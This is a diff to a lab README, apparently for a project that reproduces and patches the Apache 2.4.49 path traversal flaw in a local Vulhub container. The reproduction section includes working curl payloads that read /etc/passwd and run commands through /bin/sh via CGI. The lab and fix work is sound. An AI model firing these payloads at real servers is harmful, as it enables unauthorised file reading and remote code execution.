@@ -228,6 +228,8 @@ $ pip-audit -r requirements.txt
 No known vulnerabilities found
 ```
 
+![Local security checks](docs/screenshots/api-local.png)
+
 The GitHub Actions workflow `.github/workflows/ci.yml` runs on every push and
 pull request:
 
@@ -283,7 +285,21 @@ docker compose build
 docker compose up -d
 ```
 
-The service is available at `http://localhost:8080`.
+The service is available at `http://127.0.0.1:8080`.
+
+If Docker Hub is unreachable from your network, pull the same images through a
+registry mirror and retag them locally before building:
+
+```bash
+docker pull dockerproxy.net/vulhub/httpd:2.4.49
+docker tag  dockerproxy.net/vulhub/httpd:2.4.49 vulhub/httpd:2.4.49
+
+docker pull dockerproxy.net/library/httpd:2.4.51
+docker tag  dockerproxy.net/library/httpd:2.4.51 httpd:2.4.51
+```
+
+The mirror only supplies the image bytes; the build and all tests still run
+locally.
 
 ### 6.3 Reproduction
 
@@ -291,7 +307,7 @@ File disclosure:
 
 ```bash
 curl -v --path-as-is \
-  http://localhost:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+  http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 ```
 
 Expected vulnerable result: the contents of `/etc/passwd`, including the
@@ -301,7 +317,7 @@ Remote code execution (CGI is enabled in the Vulhub image):
 
 ```bash
 curl -v --data "echo;id" \
-  'http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
+  'http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
 ```
 
 Expected vulnerable result: output containing `uid=...`.
@@ -357,8 +373,8 @@ The script starts three environments:
 | Environment | Port | Expected traversal |
 |-------------|------|--------------------|
 | Vulhub 2.4.49 | 8080 | `200`, `/etc/passwd` disclosed |
-| 2.4.51, original permissive config | 8081 | `404`, no disclosure |
-| 2.4.51, hardened config | 8082 | `403`/`404`, no disclosure |
+| 2.4.51, original permissive config | 8081 | `400`, no disclosure |
+| 2.4.51, hardened config | 8082 | `400`, no disclosure |
 
 It also requests `/` on the fixed environment to confirm that normal
 functionality still works (regression test).
@@ -368,10 +384,8 @@ functionality still works (regression test).
 Store the reproduction and fix screenshots in `docs/screenshots/`:
 
 ```markdown
-![Vulnerable traversal](docs/screenshots/cve-traversal-before.png)
-![CGI command execution](docs/screenshots/cve-rce-before.png)
-![Fixed traversal](docs/screenshots/cve-traversal-after.png)
-![Regression test](docs/screenshots/cve-regression.png)
+![Vulnerable traversal and CGI execution](docs/screenshots/cve-before.png)
+![Fixed environments and regression test](docs/screenshots/cve-after.png)
 ```
 
 ## 7. Submission checklist
